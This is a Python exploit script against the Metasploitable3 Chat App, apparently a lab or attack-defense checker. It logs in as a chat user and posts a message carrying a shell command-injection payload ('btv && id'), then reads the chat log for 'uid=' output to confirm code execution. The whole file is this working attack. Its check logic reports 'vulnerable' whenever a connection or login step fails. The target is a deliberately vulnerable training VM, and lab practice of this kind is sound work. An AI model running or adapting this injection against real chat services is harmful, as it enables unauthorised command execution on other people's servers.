#!/usr/bin/env python3

import requests
import argparse
from html import escape
from bs4 import BeautifulSoup
from time import sleep, time

import logging

log = logging.getLogger(__name__)


class Chat:
    def __init__(self):
        self.__host = None
        self.__port = 80
        self.__post = "/chat/post.php"
        self.__logs = "/chat/read_log.php"
        self.__enter = "/chat/index.php"
        self.__name = "toodrunktohack"
        self.__payload = escape("btv+%26%26+id")
        self.__requests = requests.session()

    def __cookie(self):
        log.debug(f"[!] Retrieving Cookie ({self.__host})")
        r = self.__requests.get(f"http://{self.__host}:{self.__port}{self.__enter}")
        if r.status_code != 200:
            return False
        return True

    def __login(self):
        log.debug(f"[!] Logging in ({self.__host})")
        params = {"name": self.__name, "enter": "Enter"}
        r = self.__requests.post(
            f"http://{self.__host}:{self.__port}{self.__enter}", data=params
        )
        if r.status_code != 200:
            return False
        return True

    def __read(self):
        log.debug(f"[!] Retreiving data ({self.__host})")
        r = self.__requests.get(f"http://{self.__host}:{self.__port}{self.__logs}")
        if "Papa Smurf" not in r.text:
            return False
        return True

    def __check(self):
        log.debug(f"[!] Checking service status ({self.__host})")
        data = {"_": time()}
        r = self.__requests.get(
            f"http://{self.__host}:{self.__port}{self.__logs}", params=data
        )
        msgs = BeautifulSoup(r.text, "lxml").find_all("div")
        # Loop last 10 messsages
        if len(msgs) < 5:
            return True
        for i in msgs[-9:]:
            if "uid=" in i.text:
                log.info(f"[!] Target is vulnerable ({self.__host})")
                return True
        log.info(f"[!] Target not vulnerable ({self.__host})")
        return False

    def __exploit(self):
        log.debug(f"[!] Sending Chat App exploit ({self.__host})")
        whoami = {"text": f"do you know {self.__payload}"}
        r = requests.post(
            f"http://{self.__host}:{self.__port}{self.__post}",
            data=whoami,
            cookies=self.__requests.cookies,
        )
        if r.status_code != 200:
            log.info(f"[!] Unable to connect to Chat App ({self.__host})")
            return True
        sleep(5)
        return self.__check()

    def run(self, host, port=None):
        self.__host = host
        log.debug(f"[+] Exploiting Metasploitable3 Chat App ({self.__host})")
        if port:
            self.__port = port
        if not self.__cookie():
            log.info(
                f"[!] Error in receiving cookie, reporting vulnerable ({self.__host})"
            )
            return True
        if not self.__login():
            log.info(f"[!] Error in logging in, reporting vulnerable ({self.__host})")
            return True
        if not self.__read():
            log.info(
                f"[!] Error in getting page data, reporting vulnerable ({self.__host})"
            )
            return True
        return self.__exploit()


def main(args):
    log.info("[+] Exploiting Metasploitable3 Chat App by xentrick")
    log.info(f"[+] Exploiting {args.host}:{args.port}")

    exploit = Chat()
    if exploit.run(args.host, int(args.port)):
        log.info("Target exploited")
    else:
        log.info("Exploit failed.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("port")
    args = parser.parse_args()

    main(args)
